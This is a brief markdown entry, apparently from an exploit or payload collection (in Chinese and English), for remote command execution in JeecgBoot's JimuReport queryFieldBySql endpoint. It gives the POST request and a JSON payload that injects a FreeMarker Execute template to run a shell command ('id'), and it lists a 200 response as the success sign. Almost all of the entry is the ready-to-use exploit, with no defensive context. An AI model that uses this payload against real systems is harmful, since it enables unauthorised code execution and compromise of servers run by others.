# jeecg-queryFieldBySql-rce

jeecg-queryFieldBySql ｜ 命令执行 ｜ —
- **请求**：`POST /jmreport/queryFieldBySql HTTP/1.1`

**Payload**
```
{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```
- **响应特征**：200